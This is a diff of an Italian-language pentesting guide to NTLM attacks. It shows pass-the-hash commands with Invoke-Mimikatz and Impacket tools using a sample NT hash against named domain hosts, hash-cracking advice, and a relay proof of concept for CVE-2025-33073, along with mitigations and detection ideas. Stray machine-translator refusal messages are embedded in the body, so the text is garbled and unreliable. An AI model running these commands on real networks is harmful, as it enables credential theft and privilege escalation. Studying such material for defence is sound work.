@@ -71,7 +71,7 @@ L'**hash NT (16byte)** è diviso in **3 parti di 7byte ciascuna** (7B + 7B + (2B
 - Mancanza di **randomness**
 - Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
 - **DES è crackabile**
-- La 3º chiave è sempre composta da **5 zeri**.
+- La 3ª chiave è sempre composta da **5 zeri**.
 - Dato la **stessa sfida**, la **risposta** sarà **la stessa**. Quindi, puoi dare come **sfida** alla vittima la stringa "**1122334455667788**" e attaccare la risposta utilizzando **tabelle rainbow precompute**.
 
 ### Attacco NTLMv1
@@ -150,7 +150,7 @@ Mi dispiace, ma non hai fornito il testo da tradurre. Per favore, invia il conte
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you would like me to translate. Please provide the content you want translated to Italian.
+I'm sorry, but I need the specific text you would like me to translate in order to assist you. Please provide the content you want translated.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -162,12 +162,12 @@ La **lunghezza della sfida è di 8 byte** e **vengono inviati 2 risposte**: una 
 
 La **seconda risposta** è creata usando **diversi valori** (una nuova sfida del client, un **timestamp** per evitare **attacchi di ripetizione**...)
 
-Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere il dominio, il nome utente, la sfida e la risposta e provare a craccare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere il dominio, il nome utente, la sfida e la risposta e provare a decifrare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
 **Una volta che hai l'hash della vittima**, puoi usarlo per **impersonarla**.\
-Devi usare un **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** all'interno di **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash verrà utilizzato.** L'ultima opzione è ciò che fa mimikatz.
+Devi usare un **tool** che eseguirà l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** all'interno del **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash verrà utilizzato.** L'ultima opzione è ciò che fa mimikatz.
 
 **Per favore, ricorda che puoi eseguire attacchi Pass-the-Hash anche usando account di computer.**
 
@@ -177,7 +177,7 @@ Devi usare un **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Questo avvierà un processo che apparterrà agli utenti che hanno avviato mimikatz, ma internamente in LSASS le credenziali salvate sono quelle all'interno dei parametri di mimikatz. Poi, puoi accedere alle risorse di rete come se fossi quell'utente (simile al trucco `runas /netonly`, ma non è necessario conoscere la password in chiaro).
+Questo avvierà un processo che apparterrà agli utenti che hanno avviato mimikatz, ma internamente in LSASS le credenziali salvate sono quelle all'interno dei parametri di mimikatz. Quindi, puoi accedere alle risorse di rete come se fossi quell'utente (simile al trucco `runas /netonly`, ma non è necessario conoscere la password in chiaro).
 
 ### Pass-the-Hash da linux
 
@@ -190,7 +190,7 @@ Puoi scaricare [i binari impacket per Windows qui](https://github.com/ropnop/imp
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (In questo caso devi specificare un comando, cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- **atexec.exe** (In questo caso è necessario specificare un comando, cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 - Ci sono diversi altri binari Impacket...
 
 ### Invoke-TheHash
@@ -256,7 +256,7 @@ Il PoC può essere trovato in **[https://github.com/eladshamir/Internal-Monologu
 **Leggi una guida più dettagliata su come eseguire questi attacchi qui:**
 
 {{#ref}}
-../../generic-methodologies-and-resources/pentesting-network/`spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md`
+../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
 ## Analizza le sfide NTLM da una cattura di rete
@@ -275,7 +275,7 @@ Microsoft ha interrotto la maggior parte delle catene pubbliche con MS08-068 (SM
 2. La vittima è costretta ad autenticarsi a quel nome host (PetitPotam, DFSCoerce, ecc.).
 3. Quando il client SMB passa la stringa di destinazione `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serializzato, lasciando **`cifs/srv1`**.
 4. `msv1_0!SspIsTargetLocalhost` (o l'equivalente Kerberos) ora considera la destinazione come *localhost* perché la parte breve dell'host corrisponde al nome del computer (`SRV1`).
-5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta **il token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creato un chiave di sottosessione contrassegnata come SYSTEM).
+5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta **il token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creato un key di subsessione contrassegnato come SYSTEM).
 6. Ritrasmettere quell'autenticazione con `ntlmrelayx.py` **o** `krbrelayx.py` conferisce pieni diritti di SYSTEM sullo stesso host.
 
 ### Quick PoC
@@ -295,18 +295,18 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 # Relay listener (Kerberos) – remove NTLM mechType first
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
-### Patch & Mitigazioni
-* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui obiettivo contiene informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
+### Patch & Mitigations
+* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contiene informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Forzare la **firma SMB** per prevenire la riflessione anche su host non patchati.
 * Monitorare i record DNS che somigliano a `*<base64>...*` e bloccare i vettori di coercizione (PetitPotam, DFSCoerce, AuthIP...).
 
-### Idee di rilevamento
+### Detection ideas
 * Catture di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` dove l'IP del client ≠ l'IP del server.
 * Kerberos AP-REQ contenente una chiave di sottosessione e un principale client uguale al nome host.
 * Accessi al sistema Windows Event 4624/4648 immediatamente seguiti da scritture SMB remote dallo stesso host.
 
-## Riferimenti
-* [Synacktiv – NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
+## References
+* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
 * [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 
 {{#include ../../banners/hacktricks-training.md}}
